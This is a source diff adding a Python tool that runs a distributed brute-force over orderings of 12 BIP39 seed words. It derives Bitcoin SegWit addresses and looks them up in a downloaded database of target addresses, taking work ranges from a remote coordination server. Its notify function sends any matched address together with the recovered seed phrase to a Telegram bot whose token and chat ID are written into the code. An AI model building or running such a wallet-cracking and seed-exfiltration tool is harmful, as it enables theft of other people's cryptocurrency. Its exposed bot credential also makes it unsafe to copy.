@@ -1,0 +1,238 @@
+import os
+from mnemonic import Mnemonic
+import hashlib
+from Crypto.Hash import RIPEMD160
+from bip32utils import BIP32Key
+import bech32
+import time
+import math
+import multiprocessing
+import requests
+import urllib.request
+import zipfile
+import sqlite3
+# =================== Fake HashLib for ripemd160 ===================
+HashLib_Original = hashlib.new
+def HashLib_Fake(name, data):
+    if name == 'ripemd160':
+        r160 = RIPEMD160.new()
+        r160.update(data)
+        return r160
+    else:
+        return HashLib_Original(name, data)
+hashlib.new = HashLib_Fake
+# =================== Fake HashLib for ripemd160 ===================
+M         = Mnemonic("english")
+H         = 0x80000000 
+F         = "Records.zip"
+F2        = "Records.db"
+cpu_count = multiprocessing.cpu_count()
+FILE      = f"https://github.com/JikkkoNikiGFD1930/0/releases/download/v0/{F}"
+conn      = sqlite3.connect('Records.db')
+cursor    = conn.cursor()
+HTTP_SERVER_URL = "http://sandbox.abdee.ir/"
+def exists(record):
+    cursor.execute('SELECT 1 FROM records WHERE record = ? LIMIT 1', (record,))
+    return cursor.fetchone() is not None
+def format_size(bytes_size):
+    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+        if bytes_size < 1024:
+            return f"{bytes_size:.2f} {unit}"
+        bytes_size /= 1024
+def check_file_downloaded_extracted():
+    if not os.path.exists(F):
+        print("🔴 File not found. Downloading...")
+        urllib.request.urlretrieve(FILE, F)
+        with zipfile.ZipFile(F, 'r') as z:
+            z.extractall('.')
+        file_size = format_size(os.path.getsize(F2))
+        print(f"✅ Download & Extraction complete. File Size: {file_size}")
+    if not os.path.exists(F2):
+        print("🏁 File Not Downloaded! or Not Extracted! 🔴\nProgram Died!\n❌❌❌❌❌")
+        exit(0)
+def format_seconds(seconds):
+    seconds = round(seconds)
+    hours = seconds // 3600
+    minutes = (seconds % 3600) // 60
+    sec = seconds % 60
+    return f"{hours}h:{minutes}m:{sec}s"
+def wordsINorder( mnemo ):
+    indexed_words = []
+    for word in mnemo:
+        if word in M.wordlist:
+            index = M.wordlist.index(word)
+            indexed_words.append((word, index))
+    indexed_words.sort(key=lambda x: x[1])
+    str = []
+    for word, index in indexed_words:
+        str.append(f"{word}({index+1})")
+    output = "🏁 " + ("|".join(str))
+    print( output )
+    return output
+def encode_segwit_address(pubkey_hash):
+    witness_version = 0
+    witprog = bech32.convertbits(pubkey_hash, 8, 5)
+    return bech32.bech32_encode("bc", [witness_version] + witprog)
+def make(words):
+    # start_time   = time.time()
+    seed = M.to_seed(words)
+    bip32_root_key = BIP32Key.fromEntropy(seed)
+    bip32_child_key = bip32_root_key.ChildKey(84 + H) \
+                                .ChildKey(0 + H) \
+                                .ChildKey(0 + H) \
+                                .ChildKey(0) \
+                                .ChildKey(0)
+    public_key = bip32_child_key.PublicKey()
+    sha256_hash = hashlib.sha256(public_key).digest()
+    ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
+    segwit_address = encode_segwit_address(ripemd160_hash)
+    # print("Mnemonic:", words)
+    # print("Public Key (HEX):", public_key.hex())
+    # print("Bitcoin Address:", segwit_address)
+    # elapsed_time = time.time() - start_time
+    # print(f"🟡  make wallet Elapsed time: {elapsed_time:.6f} seconds")
+    return segwit_address
+def search( address, P ):
+    # print( address )
+    # start_time   = time.time()
+    result       = exists(f"{ address[3:15] }")
+    # elapsed_time = time.time() - start_time
+    # print(f"❌ { address[3:15] } search_in_memory Elapsed time: {elapsed_time:.6f} seconds")
+    if(result):
+        print(f"✅ Found {address}\n{P}")
+        notify(f"✅ Found {address}\n{P}")
+        return result
+    # else:
+        # print("🔴 NotFound")
+    return False
+def notify(msg, message_id=None, type="success", retries=5, delay=2 ):
+    for attempt in range(retries):
+        try:
+            if message_id:
+                # Edit an existing message if message_id is passed
+                response = requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/editMessageText",
+                                        data={"chat_id": "567639577", "message_id": message_id, "text": msg, "parse_mode": "Markdown"})
+            else:
+                # Send a new message if message_id is not passed
+                response = requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/sendMessage",
+                                        data={"chat_id": "567639577", "text": msg, "parse_mode": "Markdown"}) 
+            response_data = response.json()
+            if response.status_code == 200 and "result" in response_data:
+                if not message_id:
+                    return response_data["result"]["message_id"] 
+                return True
+            else:
+                print( "🔴 Telegram Error: ", response_data )
+            time.sleep(delay)
+        except Exception as e:
+            print(f"⚠️ Telegram Connection failed [notify_{type}] (Attempt {attempt + 1}/{retries}): {e}")
+            if attempt < retries - 1:
+                time.sleep(delay)
+            else:
+                print(f"❌ Telegram Max retries reached. [notify_{type}]")
+                print("Message was:")
+                print(msg)
+                return None
+def send(json_data, timeout=30, retries=5, retry_delay=2):
+    headers = {
+        "X-USERNAME":   USERNAME,
+        "X-CORES":      str(cpu_count),
+        "Content-Type": "application/json"
+    }
+    for attempt in range(retries):
+        try:
+            response = requests.get(HTTP_SERVER_URL, headers=headers, params=json_data, timeout=timeout)
+            if response.status_code == 200:
+                print("Request successful!")
+                return response.json()
+            else:
+                print(f"Attempt {attempt+1} failed with status code {response.status_code}")
+        except requests.RequestException as e:
+            print(f"Attempt {attempt+1} failed with error: {e}")
+
+        if attempt < retries - 1:
+            time.sleep(retry_delay)
+    print("All attempts failed.")
+    return None
+def get_share(words, share_number, total_shares=400):
+    if not (1 <= share_number <= total_shares):
+        raise ValueError(f"{share_number} is out of {total_shares}")
+
+    total_perm = math.factorial(len(words))
+    share_size = total_perm // total_shares
+
+    start_index = (share_number - 1) * share_size
+    end_index = start_index + share_size if share_number < total_shares else total_perm
+
+    for index in range(start_index, end_index):
+        yield perm_by_index(words, index)
+def perm_by_index(words, index):
+    words = sorted(words)
+    n = len(words)
+    permutation = []
+    elements = words.copy()
+
+    for i in range(n):
+        fact = math.factorial(n - i - 1)
+        position = index // fact
+        permutation.append(elements.pop(position))
+        index %= fact
+
+    return permutation
+def get_indices_for_share(words, share_number, total_shares=400):
+    total_perm = math.factorial(len(words))
+    share_size = total_perm // total_shares
+    start_index = (share_number - 1) * share_size
+    end_index = start_index + share_size if share_number < total_shares else total_perm
+    return range(start_index, end_index)
+def worker(args):
+    words, indices_batch = args
+    Total = 0
+    for idx in indices_batch:
+        start_time = time.time()
+        P          = " ".join( perm_by_index(words, idx) ).strip()
+        Total      += 1
+        status     = M.check(P)
+        if status:
+            search( make(P), P )
+            if Total % 10_000 == 0:
+                print(f"P ({P})=>[{status}] done in {time.time()-start_time:.6f}")
+    return Total
+def request_a_range():
+    return send({"type": "requestRange"})
+def make_range_done(range_id):
+    return send({"type": "completeRange", "id": range_id})
+def work():
+    _range    = request_a_range()
+    range_id = _range['id']
+    words    = _range['words'].split()
+    if len(words) != 12:
+        print("words is not in a good template", _range['words'])
+        return
+    share = int(_range['share'])
+    if share > 400 or share < 0:
+        print("share number is not valid", _range['share'])
+        return
+    print(f"🟡 New Task ==> Range #{range_id}(#{share})")
+    start_time = time.time()
+    Total = 0
+    
+    perm_indices = list(get_indices_for_share(words, share))
+    batch_size = 10_000
+    indices_batches  = [perm_indices[i:i + batch_size] for i in range(0, len(perm_indices), batch_size)]
+    
+    with multiprocessing.Pool(cpu_count) as pool:
+        for result_batch in pool.imap_unordered(worker, [(words, batch) for batch in indices_batches]):
+            Total += result_batch
+            
+    print(f"Task Share #{share} ({words[0]},{words[1]}, ...) Done in {format_seconds(time.time()-start_time)} / Total: {Total:,} FullPAck:{bool(479001600 / Total == 400)}")
+    make_range_done(range_id)
+if __name__ == '__main__':
+    # ========== Download & Extract Needed SqLlite3 File ==========
+    start_time = time.time()
+    print("🔄 Initializing.... Please wait... 🙏")
+    check_file_downloaded_extracted()
+    print(f"✅ Database made ready in { time.time() - start_time } seconds")
+    # ========== Download & Extract Needed SqLlite3 File ==========
+    while True:
+        work()
